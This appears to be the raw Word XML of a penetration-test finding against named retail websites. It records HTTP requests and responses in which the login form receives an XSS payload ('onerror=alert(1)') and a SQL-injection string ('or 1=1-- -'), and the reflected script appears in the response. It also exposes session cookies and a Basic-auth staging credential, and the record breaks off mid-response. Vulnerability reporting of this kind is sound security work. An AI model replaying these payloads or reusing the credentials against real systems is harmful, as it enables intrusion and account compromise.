                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0075C1FF" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>name</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="2234F082" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="544F4B74" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="010E71EB" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Anonymous User</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63FB5E2D" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D58DD78" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Request 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /dashboard/login.php HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621396035.1.1.1621401054.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.1.1621400948.1621399208.; _pk_ses.554926188.f710=*; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzjzrzlzizjzizdzgzkzlzgznzjzkzjzizdzizlzhzizgzqzqzhzjzqzdzhzdzizlzhziznzjzjzqznzkzdzizlzhziznzjzjzqznzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw987gt0U2YSjDpYoU8IBDeVJ%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=85210%2C88446%2C47882%2C94048; recommend_products=71063%2C100495%2C97269%2C100494%2C97267%2C71055%2C78252%2C71148%2C26344%2C71152; nkcarttime=1621400740; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=ZX-H2V9MWVY5MXMwb2V1ZXd2VlpnMDd1cnE0MHJmcXhqMkdrVSUyQndiNWZab3B6c0VvR3RWczZTUnNGU1d2UUV3a1A1Sk9uJTJGUlo3b3lZNmclMkZqZ2R0ZXJISVd1aWZaSUxOREZTb0E0Q09PR04yd0xkU0QzbXlGTmlrdWNnTkF4MnZNcFVoejhmRGZlU2lzREs1NzJsa0I0TSUyQjl1UTFyVkx4QlhWSk5wYVlVRUNuc2ljQXV0Tlk3NTU2MTRjRlpFVUZlVE9selpZRTJGYSUyQmlsNWk4WWFoSk1oc25ndyUzRCUzRA; nkcart=2; gr_rt=17982ec8c2d-a3443b6d74673b0d; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
              <w:br/>
              <w:t>Content-Length: 87</w:t>
              <w:br/>
              <w:t>Origin: https://staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Referer: https://staging2.nguyenkimmall.com/dashboard/login.php</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>name=kietna%40hpt.vn\"&gt;&lt;img+src=x+onerror=alert(1);&gt;&amp;pass[]=aa'+or+1=1--+-&amp;rememberme=on""</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Response 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 200 OK</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 05:39:53 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: text/html; charset=UTF-8</w:t>
              <w:br/>
              <w:t>Content-Length: 2952</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>X-Powered-By: PHP/7.0.29</w:t>
              <w:br/>
              <w:t>Expires: Thu, 19 Nov 1981 08:52:00 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: no-store, no-cache, must-revalidate</w:t>
              <w:br/>
              <w:t>Pragma: no-cache</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t xml:space="preserve">            &lt;input type="email" id="inputUsername" class="form-control" placeholder="Username" required autofocus</w:t>
              <w:br/>
              <w:t xml:space="preserve">                   name="name"</w:t>
              <w:br/>
              <w:t xml:space="preserve">                   value="kietna@hpt.vn"&gt;&lt;img src=x onerror=alert(1);&gt;" /&gt;"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Image-2021-05-19 12:42:37</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Request 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /index.php?dispatch=auth.recover_password HTTP/2</w:t>
              <w:br/>
              <w:t>Host: www.nguyenkim.com</w:t>
              <w:br/>
              <w:t>Cookie: _utm_objs=; _pk_id.554926188.973b=376340701.1621399326.2.1621412347.1621410825.; _ac_client_id=376340701.1621399326; _asm_visitor_type=r; _ac_an_session=zhzlznzhzjzqzrzkzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznzizhzhzgzmzdzhzdzizlzhziznzizhzgznzkzdzizlzhziznzizhzgznzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; sid_customer_5120c=76cc919a9816115bc171701c3bf91803-C; mp_skin=desktop; SRVID=w7|YKTJ+|YKSXF; _asm_uid=376340701; _ga=GA1.2.169703168.1621399331; _gid=GA1.2.255185360.1621399331; __zi=2000.SSZzejyD5ja-a_QhmHqUcJQLzgUEK0FNE8sq-vnQ7SLwdwBfamGMm3_HfkgQ3nN1FvIXwvb25yuqbg7YDZWm.1; _fbp=fb.1.1621399336880.972473971; gr_reco=17982ee7d6a-3f2e617176a790ff; adpopup_NK_POPUP_DESKTOP_cfcd208495d565ef66e7dff9f98764da=0; adpopup_NK_POPUP_MOBILE_cfcd208495d565ef66e7dff9f98764da=0; cto_bundle=6RiA-l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnE1OFN3YjZORzZDV0VxVkpsSU90SlZqU0tjd1RWWTglMkJFWFExa1ZUcE1qNHJodFB1WndlZzdCM1VvdlVzaEc4SzFsUlFSUGFrJTJCWld3WERiMmtOTEdaaHRJdiUyQlklMkZqSFFnampPQXZYYkFhOXI5NjFIJTJCbTBaS0JmVVJEckxyMDUlMkJWb2glMkJ5RUtoSWlUNkpIZVdVdzI2NmN6eklSbThib3dkbDVwaGQlMkYzZ0dkNFJw; _hjTLDTest=1; _hjid=ea16f0ac-1e83-46ca-9e1e-95b598f8bc6e; fpsend=150130; _pk_ses.554926188.973b=*; _hjAbsoluteSessionInProgress=0; gr_rt=17982ee7d6a-3f2e617176a790ff; login_false=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: application/json, text/javascript, */*; q=0.01</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</w:t>
              <w:br/>
              <w:t>X-Requested-With: XMLHttpRequest</w:t>
              <w:br/>
              <w:t>Content-Length: 101</w:t>
              <w:br/>
              <w:t>Origin: https://www.nguyenkim.com</w:t>
              <w:br/>
              <w:t>Referer: https://www.nguyenkim.com/login.html</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>user_email=kietna%40hpt.vn&amp;security_hash=8162e8d9bcafbd972569c504076a6107&amp;result_ids=save-p&amp;is_ajax=1""</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Response 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/2 200 OK</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 08:20:29 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: application/json; charset=utf-8</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding</w:t>
              <w:br/>
              <w:t>Set-Cookie: sid_customer_5120c=76cc919a9816115bc171701c3bf91803-C; expires=Wed, 02-Jun-2021 08:20:35 GMT; Max-Age=1209600; path=/; domain=.nguyenkim.com; HttpOnly</w:t>
              <w:br/>
              <w:t>Expires: Thu, 19 Nov 1981 08:52:00 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: no-store, no-cache, must-revalidate</w:t>
              <w:br/>
              <w:t>Pragma: no-cache</w:t>
              <w:br/>
              <w:t>Set-Cookie: mp_skin=desktop; path=/</w:t>
              <w:br/>
              <w:t>Set-Cookie: nkmkey=6a0c57a76500925fc3676e697aca892a; expires=Wed, 19-May-2021 20:20:36 GMT; Max-Age=43200; path=/</w:t>
              <w:br/>
